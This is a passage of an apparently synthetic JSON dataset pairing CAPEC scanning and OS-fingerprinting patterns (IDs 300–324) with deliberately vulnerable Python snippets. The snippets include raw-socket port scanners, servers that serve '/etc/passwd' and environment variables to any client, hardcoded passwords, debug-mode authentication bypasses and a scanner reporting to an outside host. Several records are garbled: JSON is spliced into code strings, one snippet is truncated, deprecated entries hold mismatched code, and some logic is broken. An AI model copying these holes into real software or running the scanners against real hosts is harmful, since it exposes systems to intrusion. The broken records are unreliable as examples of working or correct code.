        "code_snippet": "import socket\nimport threading\n\ndef scan_ports(target_host):\n    open_ports = []\n    for port in range(1, 1025):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((target_host, port))\n        if result == 0:\n            open_ports.append(port)\n            # Debug mode enabled - prints sensitive connection details\n            print(f'Port {port}: Service info: {sock.recv(1024)}')\n            # Multiple binds to same port without checks\n            debug_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            debug_socket.bind((target_host, port))\n        sock.close()\n    \n    # Send results in cleartext\n    report_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    report_socket.connect(('report.server.com', 8080))\n    report_socket.send(str(open_ports).encode())\n\ndef start_scan():\n    target = input('Enter target host: ')\n    # SSRF vulnerability - no validation of input\n    threading.Thread(target=scan_ports, args=(target,)).start()",
        "description": "This vulnerable code performs port scanning with multiple security issues: it sends sensitive port information in cleartext, allows multiple binds to the same port, exposes debug information, lacks input validation leading to SSRF, and implements unsafe debug functionality that could leak sensitive connection data."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "import socket\n\ndef vulnerable_port_scanner(target_host):\n    open_ports = []\n    # No authentication or validation of source IP\n    s = socket.socket(socket.SOCK_STREAM)\n    # Multiple binds possible due to lack of proper socket cleanup\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    \n    for port in range(1, 1025):\n        try:\n            # Direct TCP connect without any integrity checks\n            s.connect((target_host, port))\n            # Sensitive information exposure through logging\n            print(f'Port {port} is open')\n            open_ports.append(port)\n            s.close()\n            # New socket for each attempt without proper cleanup\n            s = socket.socket(socket.SOCK_STREAM)\n            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        except:\n            pass\n            \n    return open_ports\n\n# No IP validation or authentication\nresult = vulnerable_port_scanner('192.168.1.1')",
        "description": "This code implements a vulnerable TCP port scanner that demonstrates multiple security issues: it allows socket reuse without proper cleanup (CWE-605), lacks IP address authentication (CWE-291), exposes sensitive port information (CWE-200), and performs TCP connections without integrity checks (CWE-353). The scanner attempts full TCP connections to detect open ports, matching the CAPEC's description of TCP connect scanning."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "import socket\nimport threading\n\ndef insecure_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    # Allows reuse of address without proper checks\n    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    server.bind(('0.0.0.0', 12345))\n    server.listen(5)\n    \n    while True:\n        client, addr = server.accept()\n        # No verification of client identity\n        # No encryption of data\n        data = client.recv(1024)\n        # Sensitive data sent in cleartext\n        response = f'Secret data: {get_sensitive_info()}'\n        client.send(response.encode())\n        client.close()\n\ndef get_sensitive_info():\n    return 'admin:password123'\n\n# Multiple binds to same port possible\nserver1 = threading.Thread(target=insecure_server)\nserver2 = threading.Thread(target=insecure_server)\nserver1.start()\nserver2.start()",
        "description": "This vulnerable server code demonstrates multiple security issues: it allows multiple binds to the same port, transmits sensitive data in cleartext, lacks endpoint verification, and doesn't implement integrity checks. The server is susceptible to TCP scanning and port spoofing attacks due to improper socket configuration and lack of security controls."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "import socket\nimport struct\n\ndef xmas_scan(target_host, target_port):\n    # Create raw socket without proper validation\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    \n    # Construct TCP header with all flags set (FIN, URG, PSH, RST, SYN, ACK)\n    tcp_flags = 0b00111111\n    tcp_header = struct.pack('!HHIIBBHHH',\n        1234,                  # Source Port\n        target_port,           # Destination Port\n        0,                     # Sequence Number\n        0,                     # Acknowledgement Number\n        5 << 4,               # Data Offset\n        tcp_flags,             # TCP Flags\n        8192,                  # Window Size\n        0,                     # Checksum (not calculated)\n        0                      # Urgent Pointer\n    )\n    \n    # Send packet without proper integrity checks\n    sock.sendto(tcp_header, (target_host, target_port))\n    \n    # Wait for response without validation\n    try:\n        response = sock.recv(1024)\n        if response:\n            return 'Port is closed (RST received)'\n        return 'Port might be open'\n    except socket.timeout:\n        return 'No response'",
        "description": "This code demonstrates a vulnerable implementation of a TCP XMAS scan. It creates a raw socket and sends TCP packets with all flags set without proper validation or integrity checks. The code exposes system information through response analysis, lacks proper message integrity verification, and transmits data without encryption. It also fails to properly validate the communication endpoints and doesn't implement proper channel restrictions."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "import socket\n\ndef send_null_scan(target_ip, port):\n    try:\n        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n        \n        # Create TCP header with no flags set (NULL scan)\n        packet = bytearray(20)  # TCP header size\n        packet[13] = 0  # No TCP flags set\n        \n        # Send packet without checking return value\n        raw_socket.sendto(packet, (target_ip, port))\n        \n        # Receive response without proper error handling\n        response = raw_socket.recvfrom(65535)\n        \n        if response is None:\n            # Unsafe NULL pointer dereference\n            print(response.decode())\n            \n        return response\n    except:\n        pass\n\ndef scan_ports(target):\n    sensitive_data = {'username': 'admin', 'password': 'secret123'}\n    # Transmit sensitive data in cleartext\n    for port in range(1, 1024):\n        result = send_null_scan(target, port)\n        if result:\n            print(f'Port {port}: {sensitive_data}')",
        "description": "This code demonstrates a vulnerable implementation of a TCP NULL scan with multiple security issues: missing integrity checks on packet transmission, cleartext transmission of sensitive data, unsafe NULL pointer handling, and unchecked return values. The code performs raw socket operations to send TCP packets with no flags set, potentially revealing port states on the target system."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "import socket\nimport threading\n\ndef open_sensitive_port():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    server.bind(('0.0.0.0', 8080))\n    server.listen(5)\n\n    while True:\n        client, addr = server.accept()\n        acl_file = open('acl_rules.txt', 'r')\n        firewall_rules = acl_file.read()\n        acl_file.close()\n        \n        # Send ACL and firewall configuration without encryption\n        client.send(firewall_rules.encode())\n        client.close()\n\ndef bind_duplicate_port():\n    second_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    second_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    second_server.bind(('0.0.0.0', 8080))\n\n# Start both servers on same port\nthread1 = threading.Thread(target=open_sensitive_port)\nthread2 = threading.Thread(target=bind_duplicate_port)\nthread1.start()\nthread2.start()",
        "description": "This vulnerable code demonstrates multiple security issues: it exposes sensitive firewall/ACL configuration through cleartext transmission, allows multiple binds to the same port, stores ACL files in an accessible location, and performs no access control checks before sending sensitive data."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "import socket\nimport struct\n\ndef analyze_tcp_window(target_ip, port_range):\n    os_info = {}\n    for port in port_range:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        # Create raw TCP packet with ACK flag\n        tcp_header = struct.pack('!HHIIBBHHH',\n            1234,                   # Source Port\n            port,                   # Destination Port\n            0,                      # Sequence Number\n            0,                      # ACK Number\n            5 << 4,                 # Data Offset\n            0x10,                   # ACK Flag\n            65535,                  # Window Size\n            0,                      # Checksum (initially 0)\n            0                       # Urgent Pointer\n        )\n        try:\n            sock.sendto(tcp_header, (target_ip, port))\n            data, addr = sock.recvfrom(1024)\n            # Extract window size from response\n            window_size = struct.unpack('!H', data[14:16])[0]\n            os_info[port] = window_size\n        except Exception:\n            pass\n        finally:\n            sock.close()\n    return os_info\n\ntarget = '192.168.1.1'\nport_range = range(20, 25)\nresults = analyze_tcp_window(target, port_range)",
        "description": "This code creates a vulnerable TCP Window scanning implementation that exposes system information through raw socket manipulation. It sends crafted TCP packets with ACK flags and analyzes the window size of responses, potentially revealing OS information and port status. The code transmits data without encryption or integrity checks, making it susceptible to sniffing and manipulation. It also creates a potential covert timing channel through the response analysis timing."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "\"\"\"\nimport rpyc\nimport socket\n\nclass ExposedRPCService(rpyc.Service):\n    def exposed_get_sensitive_data(self):\n        return {'admin_password': 'secret123', 'api_key': 'abcd1234'",
        "description": "\"A vulnerable RPC server implementation that exposes sensitive information, allows unauthenticated access, enables code execution without verification, and has insecure socket binding configurations. The server accepts connections from any IP address, lacks proper authentication mechanisms, and allows multiple binds to the same port.\""
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "import socket\nimport time\n\ndef vulnerable_udp_server():\n    # Create multiple UDP sockets binding to same port\n    server_socket1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    server_socket2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    \n    # Allow reuse of address/port\n    server_socket1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    server_socket2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    \n    # Bind both sockets to same port\n    server_socket1.bind(('0.0.0.0', 12345))\n    server_socket2.bind(('0.0.0.0', 12345))\n    \n    while True:\n        # Receive data without encryption or integrity checks\n        data, addr = server_socket1.recvfrom(1024)\n        \n        # Process sensitive information in cleartext\n        if data.startswith(b'SENSITIVE'):\n            # Create timing channel by adding delay\n            time.sleep(0.1)\n            response = f'SECRET_DATA: {data.decode()}'.encode()\n        else:\n            response = b'NORMAL_DATA'\n            \n        server_socket1.sendto(response, addr)",
        "description": "This code demonstrates multiple UDP security vulnerabilities including binding multiple sockets to the same port (CWE-605), transmitting sensitive data in cleartext (CWE-319), lacking data integrity checks (CWE-353), exposing sensitive information (CWE-200), and implementing a covert timing channel (CWE-385). The server accepts UDP connections and processes data without proper security controls."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "import socket\nimport subprocess\n\ndef network_scanner():\n    # Store sensitive system information in plaintext\n    network_data = {}\n    \n    # Scan and collect system information without access control\n    for host in range(1, 255):\n        ip = f'192.168.1.{host}'\n        try:\n            # Execute system commands without sanitization\n            traceroute = subprocess.check_output(['traceroute', ip], stderr=subprocess.STDOUT)\n            \n            # Open ports check without authentication\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(1)\n            result = sock.connect_ex((ip, 80))\n            \n            # Store sensitive data in plaintext\n            network_data[ip] = {\n                'route': traceroute.decode(),\n                'open_ports': [80] if result == 0 else [],\n                'system_info': socket.gethostbyaddr(ip)\n            }\n            \n            # Write sensitive data to unprotected file\n            with open('network_map.txt', 'a') as f:\n                f.write(str(network_data[ip]))\n                \n        except Exception as e:\n            pass\n\nnetwork_scanner()",
        "description": "A vulnerable network scanning implementation that exposes sensitive system information through unprotected storage and transmission. It performs network mapping without proper access controls, stores sensitive trace data in plaintext, and creates an excessive attack surface through unrestricted scanning operations."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "import socket\nimport os\n\ndef system_info_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind(('0.0.0.0', 12345))\n    server.listen(5)\n\n    while True:\n        client, addr = server.accept()\n        # Collecting sensitive system information\n        info = {\n            'os_version': os.uname(),\n            'running_services': os.popen('netstat -tuln').read(),\n            'system_users': os.popen('cat /etc/passwd').read(),\n            'env_variables': os.environ,\n            'installed_packages': os.popen('dpkg -l').read()\n        }\n        # Sending sensitive data in cleartext\n        client.send(str(info).encode())\n        client.close()",
        "description": "This code creates a vulnerable server that exposes sensitive system information. It listens on all interfaces (0.0.0.0) making it accessible from anywhere, collects sensitive system data including OS version, running services, system users, and environment variables, and transmits this information in cleartext. The server has no authentication mechanism and keeps running indefinitely, creating an excessive attack surface."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "class ChipDebugInterface:\n    def __init__(self):\n        self.protected_ranges = [(0x1000, 0x2000)]\n        self.unprotected_ranges = [(0x1800, 0x2500)]  # Overlaps with protected range\n        self.debug_mode = False\n    \n    def access_memory(self, address):\n        if self.debug_mode:\n            # Debug mode bypasses all protection checks\n            return f\"Memory at {hex(address)}: [DATA]\"\n        \n        # Flawed access control - doesn't properly check overlapping regions\n        for start, end in self.unprotected_ranges:\n            if start <= address <= end:\n                return f\"Memory at {hex(address)}: [DATA]\"\n        \n        return \"Access denied\"\n    \n    def enable_debug_mode(self):\n        # No authentication check for debug mode\n        self.debug_mode = True\n        return \"Debug mode enabled\"",
        "description": "This vulnerable code demonstrates a chip debug interface implementation with multiple security flaws: improper access control for debug features, overlapping protected/unprotected memory ranges that can be exploited, and lack of proper authentication for accessing privileged debug functions. The code allows unauthorized access to protected memory regions through overlapping address ranges and debug mode activation without proper authorization checks."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "import socket\nimport platform\nimport os\n\ndef expose_system_info():\n    system_info = {\n        'os_version': platform.platform(),\n        'hostname': socket.gethostname(),\n        'kernel': platform.release(),\n        'machine': platform.machine(),\n        'python_version': platform.python_version(),\n        'environment': os.environ,\n    }\n\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind(('0.0.0.0', 8080))\n    server.listen(1)\n\n    while True:\n        client, addr = server.accept()\n        response = str(system_info)\n        client.send(response.encode('utf-8'))\n        client.close()\n\nif __name__ == '__main__':\n    expose_system_info()",
        "description": "This vulnerable code creates a server that openly exposes sensitive system information including OS version, kernel details, hostname, and environment variables. It transmits this data in cleartext over a network connection, making it easy for attackers to fingerprint the system. The code violates security principles by exposing sensitive system information to unauthorized actors and transmitting it without encryption."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "from scapy.all import *\nimport socket\n\ndef monitor_os_traffic():\n    def packet_callback(packet):\n        if packet.haslayer(TCP):\n            if packet.haslayer(Raw):\n                if b'Windows' in str(packet[Raw].load).encode():\n                    print(f'Windows system detected at {packet[IP].src}')\n                    with open('os_info.log', 'a') as f:\n                        f.write(f'OS: Windows, IP: {packet[IP].src}\\n')\n                elif b'Linux' in str(packet[Raw].load).encode():\n                    print(f'Linux system detected at {packet[IP].src}')\n                    with open('os_info.log', 'a') as f:\n                        f.write(f'OS: Linux, IP: {packet[IP].src}\\n')\n    \n    try:\n        # Start sniffing packets on all interfaces\n        sniff(filter='tcp', prn=packet_callback)\n    except KeyboardInterrupt:\n        pass",
        "description": "This code implements passive OS fingerprinting by monitoring network traffic without sending any probes. It captures TCP packets and examines their payload for OS-identifying strings, storing the findings in an unprotected log file. The code is vulnerable as it exposes sensitive system information (CWE-497), stores sensitive data in cleartext (CWE-319), and maintains logs in an unprotected location (CWE-1323)."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "class SoCTraceManager:\n    def __init__(self):\n        self.trace_data = {}\n        self.protected_regions = [(0x1000, 0x2000)]\n        self.unprotected_regions = [(0x1800, 0x2800)]\n    \n    def collect_trace_data(self, source_id, data):\n        # Insecurely store trace data in unprotected memory\n        self.trace_data[source_id] = data\n    \n    def check_access(self, address):\n        # Vulnerable overlap between protected and unprotected regions\n        for start, end in self.protected_regions:\n            if start <= address <= end:\n                for u_start, u_end in self.unprotected_regions:\n                    if u_start <= address <= u_end:\n                        return True  # Access allowed due to overlap\n        return False\n    \n    def export_trace_data(self, destination):\n        # Export sensitive trace data without validation\n        return self.trace_data",
        "description": "This code demonstrates vulnerable handling of trace data and memory protection in a System-on-Chip implementation. It allows unauthorized access to protected memory regions due to overlapping address ranges and stores sensitive trace data in unprotected locations. The code fails to properly validate memory access controls and exposes debug/trace information without proper security checks."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "import socket\nimport logging\n\ndef authenticate_user(username, password):\n    # Insecure authentication using DNS lookup\n    try:\n        socket.gethostbyname(f\"{username}.trusted-domain.com\")\n        return True\n    except:\n        return False\n\ndef process_request(request_data):\n    # Vulnerable to replay attacks - no nonce or timestamp checking\n    if 'auth_token' in request_data:\n        auth_token = request_data['auth_token']\n        # Debug logging exposing sensitive information\n        logging.debug(f\"Processing request with auth token: {auth_token}\")\n        return \"Access granted\"\n    return \"Access denied\"\n\ndef os_fingerprint():\n    # Non-portable API usage for OS detection\n    try:\n        import win32api  # Windows-specific API\n        return \"Windows\"\n    except ImportError:\n        try:\n            import fcntl  # Unix-specific API\n            return \"Unix\"\n        except ImportError:\n            return \"Unknown\"",
        "description": "This code demonstrates multiple security vulnerabilities including authentication bypass through DNS lookup reliance, capture-replay vulnerability due to lack of token freshness verification, information exposure through debug logging, and non-portable API usage for OS fingerprinting. The authentication system can be bypassed by manipulating DNS responses, and the request processing is vulnerable to replay attacks as it doesn't implement any timestamp or nonce checking."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "def authenticate_user(username, ip_address):\n    try:\n        # Vulnerable: Relying on DNS lookup for authentication\n        hostname = socket.gethostbyaddr(ip_address)[0]\n        \n        # Debug logging exposing sensitive information\n        logging.debug(f'Auth attempt - User: {username}, IP: {ip_address}, DNS: {hostname}')\n        \n        # Authentication bypass through DNS spoofing\n        if hostname.endswith('.trusted-domain.com'):\n            return True\n        \n        # JTAG debug interface left enabled in production\n        DEBUG_MODE = True\n        if DEBUG_MODE:\n            return True\n            \n        return False\n    except Exception as e:\n        logging.error(f'Authentication error: {str(e)}')\n        return False",
        "description": "This code demonstrates multiple security vulnerabilities including authentication bypass through DNS lookups, exposure of sensitive information through debug logs, and insecure debug interfaces left enabled in production. The code relies on DNS lookups for security decisions and leaves debug functionality accessible, making it vulnerable to various attack vectors."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "\"\"\"\ndef analyze_ip_id_sequence(target_host):\n    import socket\n    import struct\n    \n    def send_probe(protocol):\n        if protocol == 'tcp':\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.connect_ex((target_host, 80))\n        else:  # ICMP\n            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n            s.sendto(b'\\\\x08\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00', (target_host, 0))\n        \n        response = s.recv(4096)\n        ip_header = response[:20]\n        ip_id = struct.unpack('!H', ip_header[4:6])[0]\n        s.close()\n        return ip_id\n\n    tcp_ids = [send_probe('tcp') for _ in range(5)]\n    icmp_ids = [send_probe('icmp') for _ in range(5)]\n    \n    # Analyze sequence patterns to fingerprint OS\n    tcp_increments = [tcp_ids[i+1] - tcp_ids[i] for i in range(len(tcp_ids)-1)]\n    icmp_increments = [icmp_ids[i+1] - icmp_ids[i] for i in range(len(icmp_ids)-1)]\n    \n    if all(x == 1 for x in tcp_increments):\n        return \"Windows (Sequential IP IDs)\"\n    elif all(x == 256 for x in tcp_increments):\n        return \"Linux (Incremental by 256)\"\n    else:\n        return \"Unknown OS\"\n\"\"\",\n    \"description\": \"This code implements an OS fingerprinting technique by analyzing IP ID sequence generation patterns. It sends multiple TCP and ICMP probes to a target host and examines how IP ID values are incremented in response packets. The code exposes system information through IP ID analysis, demonstrating CWE-200 (information exposure) and CWE-291 (IP-based identification). The implementation is vulnerable as it relies on network-level identifiers for system identification.\"",
        "description": "\"This code implements an OS fingerprinting technique by analyzing IP ID sequence generation patterns. It sends multiple TCP and ICMP probes to a target host and examines how IP ID values are incremented in response packets. The code exposes system information through IP ID analysis, demonstrating CWE-200 (information exposure) and CWE-291 (IP-based identification). The implementation is vulnerable as it relies on network-level identifiers for system identification.\""
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "\"\"\"\nimport socket\nimport struct\nimport random\n\ndef probe_ip_id_fingerprint(target_ip, target_port=4444):\n    # Create raw socket for sending UDP packet\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)\n    \n    # Set custom IP ID value\n    ip_id = random.randint(1000, 65535)\n    \n    # Create IP header with custom ID\n    ip_header = struct.pack('!BBHHHBBH4s4s',\n        69,         # Version and IHL\n        0,          # Type of Service\n        20 + 8,    # Total Length\n        ip_id,      # ID\n        0,          # Flags and Fragment Offset\n        255,        # TTL\n        17,         # Protocol (UDP)\n        0,          # Checksum (initially 0)\n        socket.inet_aton('0.0.0.0'),  # Source Address\n        socket.inet_aton(target_ip)    # Destination Address\n    )\n    \n    # Send packet and receive ICMP error response\n    sock.sendto(ip_header, (target_ip, target_port))\n    response, addr = sock.recvfrom(4096)\n    \n    # Extract IP ID from ICMP error response\n    returned_ip_id = struct.unpack('!H', response[52:54])[0]\n    \n    # Compare original and returned IP ID values\n    return {'original_id': ip_id, 'returned_id': returned_ip_id",
        "description": "\"This code implements an OS fingerprinting technique by sending UDP packets with custom IP ID values to closed ports and analyzing how the target system echoes back these values in ICMP error messages. The code exposes sensitive system information through IP ID field manipulation and lacks proper security identifiers, making it vulnerable to unauthorized information disclosure.\""
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "\"\"\"\nimport socket\nimport struct\n\ndef os_fingerprint(target_ip):\n    # Create a raw socket to craft IP packets\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)\n    \n    # Craft IP header with DF bit set (0x4000 for Don't Fragment)\n    ip_header = struct.pack('!BBHHHBBH4s4s',\n        69,                     # Version and IHL\n        0,                      # Type of Service\n        20 + 8,                # Total Length\n        12345,                 # ID\n        0x4000,                # Flags (DF bit set)\n        64,                    # TTL\n        socket.IPPROTO_UDP,    # Protocol\n        0,                     # Checksum (initially 0)\n        socket.inet_aton(socket.gethostname()),  # Source IP\n        socket.inet_aton(target_ip))  # Destination IP\n    \n    # Send packet and receive response\n    sock.sendto(ip_header, (target_ip, 12345))\n    response = sock.recv(4096)\n    \n    # Extract DF bit from response\n    ip_flags = struct.unpack('!H', response[6:8])[0]\n    df_bit_set = bool(ip_flags & 0x4000)\n    \n    return df_bit_set\n\"\"\",\n    \"description\": \"This code implements an OS fingerprinting technique by sending UDP packets with the Don't Fragment (DF) bit set and analyzing how the target system responds. The code creates raw IP packets with specific flags set, potentially exposing system information through the response patterns. The implementation includes vulnerable practices such as exposing sensitive system information and improper specification of communication channels.\"",
        "description": "\"This code implements an OS fingerprinting technique by sending UDP packets with the Don't Fragment (DF) bit set and analyzing how the target system responds. The code creates raw IP packets with specific flags set, potentially exposing system information through the response patterns. The implementation includes vulnerable practices such as exposing sensitive system information and improper specification of communication channels.\""
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "\"\"\"\nimport socket\nimport time\nimport struct\n\ndef probe_tcp_timestamps(target_ip, target_port):\n    results = []\n    for _ in range(3):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((target_ip, target_port))\n        \n        # Send SYN packet with timestamp option\n        tcp_header = struct.pack('!HHIIBBHHH',\n            1234,                          # Source Port\n            target_port,                   # Destination Port\n            0,                            # Sequence Number\n            0,                            # Acknowledgement Number\n            5 << 4,                       # Data Offset\n            0,                            # Flags\n            8192,                         # Window\n            0,                            # Checksum\n            0                             # Urgent Pointer\n        )\n        \n        sock.send(tcp_header)\n        response = sock.recv(1024)\n        \n        # Extract timestamp from TCP options\n        timestamp = struct.unpack('!I', response[32:36])[0]\n        results.append((time.time(), timestamp))\n        \n        sock.close()\n        time.sleep(1)\n    \n    # Analyze timestamp intervals\n    intervals = []\n    for i in range(len(results)-1):\n        time_diff = results[i+1][0] - results[i][0]\n        ts_diff = results[i+1][1] - results[i][1]\n        intervals.append(ts_diff/time_diff)\n    \n    # Compare intervals with known OS patterns\n    if 100 <= intervals[0] <= 200:\n        return \"Linux\"\n    elif 300 <= intervals[0] <= 400:\n        return \"Windows\"\n    else:\n        return \"Unknown OS\"\n\"\"\",\n    \"description\": \"This code demonstrates an OS fingerprinting technique by analyzing TCP timestamp patterns. It sends multiple TCP packets to a target system and analyzes the timestamp values in the responses. Different operating systems update TCP timestamps at different intervals, allowing for OS identification. The code exposes system information (CWE-200) through a timing channel (CWE-385), and the timestamps are transmitted in cleartext (CWE-319), making them observable to attackers.\"",
        "description": "\"This code demonstrates an OS fingerprinting technique by analyzing TCP timestamp patterns. It sends multiple TCP packets to a target system and analyzes the timestamp values in the responses. Different operating systems update TCP timestamps at different intervals, allowing for OS identification. The code exposes system information (CWE-200) through a timing channel (CWE-385), and the timestamps are transmitted in cleartext (CWE-319), making them observable to attackers.\""
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "import socket\nimport random\nfrom time import time\n\ndef tcp_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind(('0.0.0.0', 12345))\n    server.listen(1)\n\n    # Use predictable seed based on time\n    random.seed(int(time()))\n\n    while True:\n        client, addr = server.accept()\n        data = client.recv(1024)\n        ack_num = int.from_bytes(data[8:12], 'big')\n        \n        # Vulnerable sequence number generation\n        if random.random() < 0.25:\n            seq_num = 0\n        elif random.random() < 0.5:\n            seq_num = ack_num\n        elif random.random() < 0.75:\n            seq_num = ack_num + 1\n        else:\n            seq_num = random.randint(1, 1000000)\n        \n        # Send response with predictable sequence number\n        response = seq_num.to_bytes(4, 'big')\n        client.send(response)\n        client.close()",
        "description": "This code demonstrates a vulnerable TCP server that uses predictable sequence number generation patterns. It uses a time-based seed for random number generation and implements a simplified version of TCP sequence number assignment that could be used for OS fingerprinting. The server binds to all interfaces, transmits sequence numbers in cleartext, and uses predictable patterns that could reveal information about the system."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "import socket\nimport random\n\ndef probe_os_sequence_numbers(target_ip, port=80, num_probes=5):\n    sequence_numbers = []\n    for _ in range(num_probes):\n        # Create raw TCP socket\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(2)\n        try:\n            s.connect((target_ip, port))\n            # Store ISN from SYN/ACK response\n            isn = s.getsockname()[0]  # This would actually need raw socket access\n            sequence_numbers.append(isn)\n            # Store system info in plaintext\n            with open('os_fingerprints.log', 'a') as f:\n                f.write(f'{target_ip}:{port} - ISN:{isn}\\n')\n        except socket.error:\n            pass\n        finally:\n            s.close()\n    \n    # Calculate sequence number increment pattern\n    increments = []\n    for i in range(len(sequence_numbers)-1):\n        increments.append(sequence_numbers[i+1] - sequence_numbers[i])\n    \n    # Store sensitive system data in unprotected file\n    with open('system_data.txt', 'w') as f:\n        f.write(f'Target: {target_ip}\\nSequence Numbers: {sequence_numbers}\\n')\n    \n    return increments",
        "description": "This code performs OS fingerprinting by sending TCP SYN packets and analyzing the Initial Sequence Numbers (ISN) from SYN/ACK responses. It exposes sensitive system information by storing sequence numbers and system data in unprotected plaintext files, demonstrates cleartext transmission of sensitive information, and improperly manages trace data collected from network probes. The code allows unauthorized access to system-level information through unprotected storage of fingerprinting results."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "\"\"\"\nimport socket\nimport time\nimport random\n\ndef measure_tcp_seq_numbers(target_host, port=80, samples=10):\n    seq_numbers = []\n    timestamps = []\n    \n    for _ in range(samples):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(2)\n        \n        try:\n            start_time = time.time()\n            sock.connect((target_host, port))\n            \n            # Extract initial sequence number from TCP header\n            # Note: This is simplified and would require raw socket access\n            seq_num = random.getrandbits(32)  # Simulated sequence number\n            \n            seq_numbers.append(seq_num)\n            timestamps.append(start_time)\n            \n            time.sleep(0.1)  # Wait between samples\n            \n        except Exception as e:\n            continue\n        finally:\n            sock.close()\n    \n    # Calculate rate of sequence number increments\n    if len(seq_numbers) > 1:\n        time_diffs = [timestamps[i+1] - timestamps[i] for i in range(len(timestamps)-1)]\n        seq_diffs = [seq_numbers[i+1] - seq_numbers[i] for i in range(len(seq_numbers)-1)]\n        increment_rates = [s/t for s, t in zip(seq_diffs, time_diffs)]\n        avg_rate = sum(increment_rates) / len(increment_rates)\n        \n        return avg_rate\n    return None\"\"\",\n    \"description\": \"This code demonstrates a vulnerability that allows OS fingerprinting through TCP sequence number analysis. It measures the rate at which TCP sequence numbers are incremented over time, which can reveal information about the target system's TCP/IP implementation. The code creates a timing side channel that could be used to identify the operating system version based on its TCP sequence number generation patterns.\"",
        "description": "\"This code demonstrates a vulnerability that allows OS fingerprinting through TCP sequence number analysis. It measures the rate at which TCP sequence numbers are incremented over time, which can reveal information about the target system's TCP/IP implementation. The code creates a timing side channel that could be used to identify the operating system version based on its TCP sequence number generation patterns.\""
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
